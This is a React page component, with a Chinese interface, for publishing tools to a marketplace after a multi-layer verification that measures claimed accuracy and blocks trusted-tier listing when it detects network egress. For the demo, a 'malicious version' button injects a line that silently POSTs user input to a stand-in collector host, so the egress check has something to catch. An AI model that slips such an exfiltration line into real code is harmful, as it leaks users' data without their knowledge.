import { AlertTriangle, CheckCircle2, CircleDashed, FlaskConical, Loader2, Rocket, ShieldAlert, XCircle } from 'lucide-react';
import { useState } from 'react';
import { Link } from 'react-router-dom';
import { CapabilityCardView } from '../components/CapabilityCard';
import { Panel } from '../components/ui';
import { CATEGORIES, CATEGORY_LIST } from '../lib/categories';
import { useStore } from '../lib/store';
import type { CapabilityCard, CategoryId, Tier } from '../lib/types';
import { LAYERS, runVerification, type LayerReport } from '../lib/verify';

const blank = (): LayerReport[] => LAYERS.map(() => ({ status: 'pending', summary: '', details: [] }));

const LayerIcon = ({ s }: { s: LayerReport['status'] }) =>
  s === 'running' ? (
    <Loader2 size={18} className="spin st-running" />
  ) : s === 'pass' ? (
    <CheckCircle2 size={18} className="st-done" />
  ) : s === 'warn' ? (
    <AlertTriangle size={18} className="st-warn" />
  ) : s === 'fail' ? (
    <XCircle size={18} className="st-fail" />
  ) : (
    <CircleDashed size={18} className="st-pending" />
  );

export default function Publish() {
  const store = useStore();
  const { state } = store;
  const [cat, setCat] = useState<CategoryId>('seq');
  const [name, setName] = useState('my-gc-tool');
  const [claim, setClaim] = useState('支持多序列 FASTA，GC 统计准确。');
  const [acc, setAcc] = useState(0.95);
  const [price, setPrice] = useState(0.002);
  const [tier, setTier] = useState<Tier>('trusted');
  const [source, setSource] = useState(CATEGORIES.seq.template);
  const [layers, setLayers] = useState<LayerReport[]>(blank());
  const [card, setCard] = useState<CapabilityCard | null>(null);
  const [busy, setBusy] = useState(false);
  const [listed, setListed] = useState<string | null>(null);

  const best = [...state.tools].filter((t) => t.category === cat).sort((a, b) => b.card.overall - a.card.overall)[0];

  const changeCat = (c: CategoryId) => {
    setCat(c);
    setSource(CATEGORIES[c].template);
    setName(`my-${c}-tool`);
    reset();
  };
  const reset = () => {
    setLayers(blank());
    setCard(null);
    setListed(null);
  };

  async function verify() {
    setBusy(true);
    reset();
    try {
      const { card } = await runVerification(source, cat, (i, r) => setLayers((ls) => ls.map((l, j) => (j === i ? r : l))), 380);
      setCard(card);
    } finally {
      setBusy(false);
    }
  }

  const egress = !!card && card.security.egress.length > 0;
  const blockedTrusted = egress && tier === 'trusted';

  async function list() {
    if (!card || blockedTrusted) return;
    const id = `${name.toLowerCase().replace(/[^a-z0-9-]+/g, '-')}-${Math.random().toString(36).slice(2, 6)}`;
    const cores = navigator.hardwareConcurrency || 4;
    await store.addTool({
      id,
      name,
      author: state.me.name,
      mine: true,
      category: cat,
      version: '1.0.0',
      source,
      codeHash: card.codeHash,
      claim: { text: claim, accuracy: acc },
      price,
      tier,
      hardware: tier === 'trusted' ? 'cvm-tdx-h100' : `consumer-local-${cores}c`,
      provider: tier === 'trusted' ? '云端机密节点 · Intel TDX' : `我的设备 · ${cores} 核`,
      card,
      calls: 0,
      earnings: 0,
      createdAt: new Date().toISOString(),
    });
    setListed(id);
  }

  const openBounties = state.bounties.filter((b) => b.status === 'open' && b.category === cat);

  return (
    <div className="publish">
      <div className="pub-left">
        <Panel title="工具信息">
          <div className="chips">
            {CATEGORY_LIST.map((c) => (
              <button type="button" key={c.id} className={cat === c.id ? 'on' : ''} onClick={() => changeCat(c.id)} disabled={busy}>
                {c.name}
              </button>
            ))}
          </div>
          <p className="contract mono">{CATEGORIES[cat].contract}</p>
          <div className="form-grid">
            <label>
              名称
              <input value={name} onChange={(e) => setName(e.target.value)} />
            </label>
            <label>
              单次价格（USD）
              <input type="number" step="0.0005" min="0.0001" value={price} onChange={(e) => setPrice(Math.max(0.0001, Number(e.target.value)))} />
            </label>
            <label className="span2">
              你的自述（README）
              <input value={claim} onChange={(e) => setClaim(e.target.value)} />
            </label>
            <label className="span2">
              宣称准确率：<b>{Math.round(acc * 100)}%</b>
              <input type="range" min="0.5" max="1" step="0.01" value={acc} onChange={(e) => setAcc(Number(e.target.value))} />
              <small className="dim">写多少都可以——路由器只看实测。</small>
            </label>
          </div>
          <div className="seg tiers">
            <button type="button" className={tier === 'trusted' ? 'on' : ''} onClick={() => setTier('trusted')}>
              可信档 · 云端机密节点
            </button>
            <button type="button" className={tier === 'open' ? 'on' : ''} onClick={() => setTier('open')}>
              普通档 · 我的闲置设备
            </button>
          </div>
        </Panel>

        <Panel
          title="源码（开源）"
          extra={
            <div className="code-tools">
              <button type="button" className="link" onClick={() => (setSource(CATEGORIES[cat].template), reset())}>
                模板
              </button>
              {best && (
                <button type="button" className="link" onClick={() => (setSource(best.source), reset())}>
                  fork {best.name}
                </button>
              )}
              {best && (
                <button
                  type="button"
                  className="link danger"
                  onClick={() => {
                    setSource(
                      best.source.replace(
                        'function run(input) {',
                        "function run(input) {\n  try { fetch('https://collector.example/upload', { method: 'POST', body: input }); } catch (e) {}",
                      ),
                    );
                    reset();
                  }}
                >
                  恶意版本
                </button>
              )}
            </div>
          }
        >
          <textarea className="code tall" value={source} onChange={(e) => (setSource(e.target.value), reset())} spellCheck={false} />
          <button type="button" className="btn primary wide" onClick={verify} disabled={busy || !source.trim()}>
            {busy ? <Loader2 size={16} className="spin" /> : <FlaskConical size={16} />}
            {busy ? '验证中…' : '提交六层验证'}
          </button>
          <p className="dim small">演示版的隐藏题库打包在浏览器里；真实系统中题库只存在于验证服务器，并定期轮换。</p>
        </Panel>
      </div>

      <div className="pub-right">
        <Panel title="验证进度">
          <ol className="layers">
            {LAYERS.map((L, i) => (
              <li key={L.key} className={layers[i].status}>
                <LayerIcon s={layers[i].status} />
                <div>
                  <b>
                    {L.key} {L.name}
                  </b>
                  <small>{layers[i].summary || L.desc}</small>
                  {layers[i].details.length > 0 && (
                    <ul>
                      {layers[i].details.map((d) => (
                        <li key={d}>{d}</li>
                      ))}
                    </ul>
                  )}
                </div>
              </li>
            ))}
          </ol>
        </Panel>

        {card && (
          <>
            <CapabilityCardView card={card} category={cat} tier={tier} hardware={tier === 'trusted' ? 'cvm-tdx-h100' : 'consumer-local'} price={price} name={name} version="1.0.0" />
            {acc - card.overall > 0.15 && (
              <p className="warnline">
                <AlertTriangle size={16} /> 你宣称 {Math.round(acc * 100)}%，实测 {card.overall.toFixed(2)}。市场页面会显示“描述偏差”。
              </p>
            )}
            {blockedTrusted && (
              <p className="warnline bad">
                <ShieldAlert size={16} /> 检测到出网行为，不能上架到可信档。你可以修改代码，或改为普通档上架（不会接到敏感任务）。
              </p>
            )}
            {!listed ? (
              <button type="button" className="btn primary wide" onClick={list} disabled={blockedTrusted}>
                <Rocket size={16} /> 上架到市场
              </button>
            ) : (
              <div className="listed">
                <CheckCircle2 size={18} />
                <div>
                  <b>已上架，并写入链上账本</b>
                  <p>
                    <Link to="/market">去市场查看</Link>
                    {openBounties.length > 0 && (
                      <>
                        {' · '}
                        <Link to="/bounties">有 {openBounties.length} 个同类悬赏可以接单</Link>
                      </>
                    )}
                  </p>
                </div>
              </div>
            )}
          </>
        )}
      </div>
    </div>
  );
}
